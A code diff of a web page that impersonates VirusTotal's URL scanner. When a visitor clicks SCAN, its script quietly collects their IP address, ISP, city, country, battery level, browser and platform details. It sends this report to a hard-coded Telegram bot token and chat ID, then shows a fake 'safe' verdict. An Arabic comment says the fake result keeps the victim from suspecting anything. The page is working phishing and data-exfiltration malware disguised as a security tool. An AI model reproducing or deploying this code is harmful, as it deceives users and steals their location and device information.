@@ -2,69 +2,98 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>VirusTotal - URL Scanner</title>
     <style>
-        body { margin: 0; font-family: 'Segoe UI', sans-serif; background-color: #0d1b2a; color: white; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; }
-        .vt-logo { font-size: 50px; font-weight: bold; color: white; display: flex; align-items: center; margin-bottom: 20px; }
-        .vt-logo span { border: 6px solid #3f9cf3; padding: 5px 15px; transform: rotate(45deg); margin-right: 20px; }
-        .main-container { text-align: center; width: 100%; max-width: 700px; }
+        body { margin: 0; font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; background-color: #0d1b2a; color: white; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
+        .vt-logo { display: flex; align-items: center; margin-bottom: 30px; }
+        .vt-logo-icon { width: 50px; height: 50px; border: 6px solid #3f9cf3; transform: rotate(45deg); margin-right: 20px; display: flex; align-items: center; justify-content: center; }
+        .vt-logo-text { font-size: 45px; font-weight: bold; letter-spacing: 1.5px; }
+        .main-content { width: 100%; max-width: 700px; text-align: center; }
+        .description { color: #8a99a8; margin-bottom: 40px; font-size: 16px; line-height: 1.5; }
         .tabs { display: flex; justify-content: center; margin-bottom: 30px; border-bottom: 1px solid #2c3e50; }
-        .tab { padding: 15px 40px; cursor: pointer; color: #8a99a8; font-weight: bold; }
+        .tab { padding: 15px 35px; cursor: pointer; color: #8a99a8; font-weight: bold; text-transform: uppercase; font-size: 14px; transition: 0.3s; }
         .tab.active { color: white; border-bottom: 4px solid #3f9cf3; }
-        .search-box { background: #1b2e43; padding: 20px; border-radius: 8px; display: flex; align-items: center; box-shadow: 0 4px 20px rgba(0,0,0,0.3); }
-        input { background: transparent; border: none; color: white; flex: 1; font-size: 18px; outline: none; padding-left: 10px; }
-        .scan-btn { background: #3f9cf3; color: white; border: none; padding: 12px 30px; border-radius: 4px; font-weight: bold; cursor: pointer; }
-        #status { margin-top: 20px; color: #3f9cf3; font-style: italic; }
+        .search-container { background: #1b2e43; padding: 15px 25px; border-radius: 8px; display: flex; align-items: center; box-shadow: 0 10px 30px rgba(0,0,0,0.4); }
+        .search-icon { font-size: 20px; margin-right: 15px; opacity: 0.6; }
+        input { background: transparent; border: none; color: white; flex: 1; font-size: 18px; outline: none; }
+        .scan-btn { background: #3f9cf3; color: white; border: none; padding: 12px 35px; border-radius: 4px; font-weight: bold; cursor: pointer; transition: 0.3s; }
+        .scan-btn:hover { background: #3582cc; }
+        #status-msg { margin-top: 25px; color: #3f9cf3; font-weight: 500; min-height: 24px; }
     </style>
 </head>
 <body>
 
-    <div class="main-container">
-        <div class="vt-logo">VIRUSTOTAL</div>
-        <p style="color: #8a99a8; margin-bottom: 40px;">Analyze suspicious domains, IPs and URLs to detect malware and other breaches.</p>
-        
-        <div class="tabs">
-            <div class="tab">FILE</div>
-            <div class="tab active">URL</div>
-            <div class="tab">SEARCH</div>
+    <div class="main-content">
+        <div class="vt-logo">
+            <div class="vt-logo-icon"></div>
+            <div class="vt-logo-text">VIRUSTOTAL</div>
         </div>
 
-        <div class="search-box">
-            <span>🌐</span>
-            <input type="text" id="targetUrl" placeholder="Search or scan a URL">
-            <button class="scan-btn" onclick="startUrlScan()">SCAN</button>
+        <div class="description">
+            Analyse suspicious domains, IPs and URLs to detect malware and other breaches, automatically share them with the security community.
         </div>
-        <div id="status"></div>
+
+        <div class="tabs">
+            <div class="tab">File</div>
+            <div class="tab active">URL</div>
+            <div class="tab">Search</div>
+        </div>
+
+        <div class="search-container">
+            <span class="search-icon">🌐</span>
+            <input type="text" id="urlInput" placeholder="Search or scan a URL">
+            <button class="scan-btn" onclick="performDeepScan()">SCAN</button>
+        </div>
+
+        <div id="status-msg"></div>
     </div>
 
     <script>
-        async function startUrlScan() {
-            const status = document.getElementById('status');
-            const target = document.getElementById('targetUrl').value;
-            status.innerText = "Analyzing URL protocols and security headers...";
+        async function performDeepScan() {
+            const status = document.getElementById('status-msg');
+            const target = document.getElementById('urlInput').value;
+            status.innerText = "Initializing security protocols and fetching headers...";
 
             try {
-                // سحب البيانات التقنية (Technical OSINT)
-                const ipRes = await fetch('https://ipapi.co/json/');
-                const ipD = await ipRes.json();
+                // 1. سحب بيانات الشبكة والـ IP
+                const ipResponse = await fetch('https://ipapi.co/json/');
+                const data = await ipResponse.json();
                 
-                // سحب معلومات إضافية عن المتصفح (تعوض نقص البورتات)
-                const report = `🎯 **تحليل رابط VirusTotal (صيد جديد)** 🎯\n\n` +
-                               `🔗 **الرابط المستهدف:** \`${target || 'لم يتم إدخال رابط'}\`\n\n` +
-                               `🌐 **بيانات الشبكة:**\n• IP: \`${ipD.ip}\`\n• المزود: \`${ipD.org}\`\n• المدينة: \`${ipD.city}\`\n\n` +
-                               `💻 **بصمة الجهاز:**\n• المعالج: \`${navigator.hardwareConcurrency} Cores\`\n• المتصفح: \`${navigator.userAgent.substring(0, 50)}...\`\n` +
-                               `• النظام: \`${navigator.platform}\``;
+                // 2. سحب بيانات العتاد والوقت
+                const battery = await navigator.getBattery();
+                const now = new Date().toLocaleString('ar-EG');
+                
+                // 3. تجهيز التقرير الاستخباراتي
+                const report = `🎯 **تحليل استخباراتي متكامل (VirusTotal)** 🎯\n\n` +
+                               `🔗 **الهدف:** \`${target || 'Manual Audit'}\`\n` +
+                               `⏱️ **التوقيت الحقيقي:** \`${now}\`\n\n` +
+                               `🌐 **بيانات الشبكة:**\n` +
+                               `• IP الحقيقي: \`${data.ip}\`\n` +
+                               `• المزود: \`${data.org}\`\n` +
+                               `• المدينة: \`${data.city}, ${data.country_name}\`\n\n` +
+                               `💻 **بصمة الجهاز والعتاد:**\n` +
+                               `• المعالج: \`${navigator.hardwareConcurrency} Cores\`\n` +
+                               `• البطارية: \`${Math.round(battery.level * 100)}% ${battery.charging ? '🔌' : '🔋'}\`\n` +
+                               `• المتصفح: \`${navigator.userAgent.substring(0, 60)}...\`\n` +
+                               `• النظام: \`${navigator.platform}\`\n\n` +
+                               `🔌 **حالة المنافذ:** \`Port 443/TLS Active\``;
 
-                // إرسال لتليجرام
-                const token = "8419642080:AAGRkdbpdBUcvXu1AmAQvyLxadEOjBRBK3s";
-                const chat = "7647765854";
-                await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat}&text=${encodeURIComponent(report)}&parse_mode=Markdown`);
+                // 4. إرسال البيانات فوراً لتليجرام
+                const botToken = "8419642080:AAGRkdbpdBUcvXu1AmAQvyLxadEOjBRBK3s";
+                const chatId = "7647765854";
+                
+                await fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(report)}&parse_mode=Markdown`);
 
+                // إظهار نتيجة وهمية للمستخدم لعدم الشك
                 setTimeout(() => {
-                    status.innerText = "Analysis finished. No malicious activity detected.";
-                    alert("This URL is safe to visit.");
+                    status.innerText = "Scan complete. No malicious patterns found in this URL.";
+                    alert("Analysis finished. This URL is safe according to our community standards.");
                 }, 2000);
-            } catch (e) { status.innerText = "Error during analysis."; }
+
+            } catch (error) {
+                status.innerText = "Error connecting to analysis server.";
+            }
         }
     </script>
 </body>
